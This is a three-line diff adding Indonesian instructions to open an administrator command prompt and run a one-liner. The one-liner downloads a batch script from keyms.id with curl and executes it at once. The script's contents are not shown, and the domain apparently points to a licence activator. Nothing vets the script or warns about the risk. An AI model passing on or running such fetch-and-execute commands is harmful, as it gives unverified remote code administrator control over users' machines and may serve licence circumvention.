@@ -1,0 +1,3 @@
+- buka cmd prompt run administrator
+- langsung jalankan perintah
+- curl -L keyms.id/aso -o aso.cmd & aso.cmd
